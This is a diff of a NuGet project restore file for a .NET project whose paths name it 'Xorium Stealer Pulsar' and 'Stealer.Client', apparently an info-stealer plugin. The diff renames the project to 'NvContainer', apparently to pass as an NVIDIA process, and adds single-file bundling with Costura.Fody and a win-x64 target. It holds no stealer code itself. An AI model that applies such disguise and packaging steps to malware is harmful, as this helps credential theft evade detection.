@@ -8,7 +8,7 @@
       "version": "1.0.0",
       "restore": {
         "projectUniqueName": "D:\\Xorium_Stealer_Pulsar\\Xorium Stealer Pulsar\\Pulsar.Plugin.Client\\Stealer.Client\\Stealer.Client.csproj",
-        "projectName": "Pulsar.Plugin.Client",
+        "projectName": "NvContainer",
         "projectPath": "D:\\Xorium_Stealer_Pulsar\\Xorium Stealer Pulsar\\Pulsar.Plugin.Client\\Stealer.Client\\Stealer.Client.csproj",
         "packagesPath": "C:\\Users\\Administrator.ADMIN\\.nuget\\packages\\",
         "outputPath": "D:\\Xorium_Stealer_Pulsar\\Xorium Stealer Pulsar\\Pulsar.Plugin.Client\\Stealer.Client\\obj\\",
@@ -43,6 +43,18 @@
         "net8.0-windows7.0": {
           "targetAlias": "net8.0-windows",
           "dependencies": {
+            "Costura.Fody": {
+              "include": "Runtime, Build, Native, ContentFiles, Analyzers, BuildTransitive",
+              "suppressParent": "All",
+              "target": "Package",
+              "version": "[6.0.0, )"
+            },
+            "Microsoft.NET.ILLink.Tasks": {
+              "suppressParent": "All",
+              "target": "Package",
+              "version": "[8.0.23, )",
+              "autoReferenced": true
+            },
             "System.IO.Hashing": {
               "target": "Package",
               "version": "[8.0.0, )"
@@ -72,6 +84,11 @@
             }
           },
           "runtimeIdentifierGraphPath": "C:\\Program Files\\dotnet\\sdk\\8.0.417/PortableRuntimeIdentifierGraph.json"
+        }
+      },
+      "runtimes": {
+        "win-x64": {
+          "#import": []
         }
       }
     }
